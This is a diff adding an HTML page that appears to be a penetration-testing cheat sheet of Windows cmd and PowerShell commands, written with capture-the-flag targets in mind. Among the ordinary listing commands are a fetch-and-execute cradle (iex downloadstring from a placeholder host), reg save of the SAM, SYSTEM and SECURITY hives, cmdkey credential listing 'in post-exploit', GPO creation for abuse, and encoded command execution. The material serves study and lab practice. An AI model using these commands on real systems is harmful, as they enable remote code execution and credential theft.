@@ -1,0 +1,186 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+<h1>Commands</h1>
+<h2>Runas</h2>
+<div class="code-box"><pre><code>runas /user:relia.com\jim "cmd"</code></pre></div>
+<h2>cmd.exe</h2>
+<table>
+    <thead>
+        <tr>
+            <th>Command</th>
+            <td>Explain</td>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td><code>hostname</code></td>
+            <td>It returnes hostname, for instance, DC01, ERA,SECURA.</td>
+        </tr>
+        <tr>
+            <td><code>cmdkey /list</code></td>
+            <td>Displays stored credentials in Windows Credential Manager (saved RDP, network share, web creds). Useful in post-exploit to find credentials the system will auto-use.</td>
+        </tr>
+        <tr>
+            <td><code>dir /a</code></td>
+            <td>Show files with any attributes (includes hidden and system files). You can refine with flags like <code>/a:h</code> (hidden only) or <code>/a:-h</code> (exclude hidden).</td>
+        </tr>
+        <tr>
+            <td><code>dir /R</code></td>
+            <td>Displays Alternate Data Streams (ADS) for NTFS files. NTFS files can have hidden extra streams that a normal <code>dir</code> does not show.</td>
+        </tr>
+        <tr>
+            <td><code>certutil -encode file output</code></td>
+            <td>Base64-encodes <code>file</code> to <code>output</code>. Useful to safely copy binary/text via clipboard or text channels and reconstruct locally.</td>
+        </tr>
+        <tr>
+            <td><code>reg save filename outputfile_name</code></td>
+            <td><code>reg save</code> is a command that writes a registry hive (a registry file) out to disk as-is. <br>
+In other words, it's a tool to save part of the current Windows registry (for example <code>HKLM\SAM</code>, <code>HKLM\SYSTEM</code>, <code>HKLM\SECURITY</code>) to a file.</td>
+        </tr>
+        <tr>
+            <td><code>Get-Process | Where-Object { $_.ProcessName -eq "chrome" }</code></td>
+            <td>Filter processes.</td>
+        </tr>
+        
+        <tr>
+            <td><code>Get-Process | Where-Object { $_.ProcessName -notlike "*chrome*" }</code></td>
+            <td>Filter partially matched name.</td>
+        </tr>
+        <tr>
+            <td><code>Get-Process | Where-Object { $_.ProcessName -ne "chrome" }</code></td>
+            <td>Filter whole matched name.</td>
+        </tr>
+        <tr>
+            <td><code>tasklist</code> <code>/fi "imagename eq cmd.exe"</code></td>
+            <td>List all running process.</td>
+        </tr>
+        <tr>
+            <td><code><code>where /R C:\ filename</code></code></td>
+            <td>Searches recursively from <code>C:\</code> for files matching <code>filename</code> and prints full paths. Equivalent to Linux <code>find</code> for a simple name search; runs in Windows Command Prompt.</td>
+        </tr>
+        <tr>
+            <td><code>schtasks /query /v /fo LIST | findstr /I "schedule.ps1"</code></td>
+            <td>You can query schedule using schtask.</td>
+        </tr>
+    </tbody>
+</table>
+
+<h2>PowerShell</h2>
+<table>
+    <thead>
+        <tr>
+            <th>Command</th>
+            <td>Explain</td>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td><code>tree /f</code></td>
+            <td>Display current directory structure like tree format.</td>
+        </tr>
+        <tr>
+            <td><code>ls -force</code></td>
+            <td>List all folders/files even though they are hidden.</td>
+        </tr>
+        <tr>
+            <td><code>Get-Content "hm.txt" -Stream "root.txt"</code></td>
+            <td>Reads the Alternate Data Stream named <code>root.txt</code> attached to <code>hm.txt</code>. Use when data may be hidden in an NTFS ADS.</td>
+        </tr>
+        <tr>
+            <td><code>gci -force</code></td>
+            <td>Alias for <code>Get-ChildItem -Force</code>; lists items including hidden/system files in PowerShell.</td>
+        </tr>
+        <tr>
+            <td><code>gci env:</code></td>
+            <td>See environment variable for the user. You may find AppKey.</td>
+        </tr>
+        <tr>
+            <td><code>Get-ChildItem -Path "C:\" -Filter "root.txt" -Recurse</code></td>
+            <td>Searches <code>C:\</code> for entries matching <code>root.txt</code>. <code>-Filter</code> is fast but not recursive by default (use <code>-Recurse</code> if needed).</td>
+        </tr>
+        <tr>
+            <td><code>Get-ChildItem -Path "C:\" -Include "*.txt" -File -Recurse</code></td>
+            <td>Recursively finds all files under <code>C:\</code> with the <code>.txt</code> extension; <code>-File</code> restricts results to files (no directories).</td>
+        </tr>
+        <tr>
+            <td><code> (Get-Command "C:\Program Files (x86)\...\something.exe").Version</code></td>
+            <td>See exe application version</td>
+        </tr>
+        <tr>
+            <td><code>Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss</code></td>
+            <td>Search HKCU's childitem.</td>
+        </tr>
+
+        <tr>
+            <td><code>Get-Gpo -Guid 1234...5678</code></td>
+            <td>You can see details for group policies.</td>
+        </tr>
+        <tr>
+            <td><code>Get-GPO -all</code></td>
+            <td>Extract all gpo details</td>
+        </tr>
+        <tr>
+            <td><code>New-GPO -name "vulnerable one"</code></td>
+            <td>Create gpo</td>
+        </tr>
+        <tr>
+            <td><code>New-GPLink -Name "vulnerable one" -target "DC=frizz,DC=htb"</code></td>
+            <td>Add new link to the created gpo.</td>
+        </tr>
+        <tr>
+            <td><code>Gpupdate /force</code></td>
+            <td>Update GPO with force flag</td>
+        </tr>
+        <tr>
+            <td><code>iex(new-object net.webclient).downloadstring('http://$IP/$FILE')</code></td>
+            <td>downlaodstring downloads strings from the file, and iex evaluate it.</td>
+        </tr>
+        <tr>
+            <td><code>Invoke-WebRequest -URI "$URL" -OutFile file.extension</code></td>
+            <td>File installation code.</td>
+        </tr>
+        <tr>
+            <td><code>Get-ACL filename</code></td>
+            <td>Displays permission.</td>
+        </tr>
+        <tr>
+            <td><code>netstat -nto</code></td>
+            <td>We can see processes.</td>
+        </tr>
+        <tr>
+            <td><code>tasklist /v /FI "PID eq PROCESS_ID"</code></td>
+            <td>We can see details for process id.</td>
+        </tr>
+        <tr>
+            <td><code>get-process -Id PROCESS_ID</code></td>
+            <td>Like above.</td>
+        </tr>
+        <tr>
+            <td><code>get-acl FILE_NAME | select-object Owner</code></td>
+            <td>We can see file Owner.</td>
+        </tr>
+        <tr>
+            <td><code>powershell /enc BASE64</code></td>
+            <td>Acronym of -EncodedCommand</td>
+        </tr>
+        <tr>
+            <td><code>powershell -e BASE64</code></td>
+            <td>Acronym of -EncodedCommand</td>
+        </tr>
+    </tbody>
+</table>
+
+
+
+
+
+</body>
+</html>
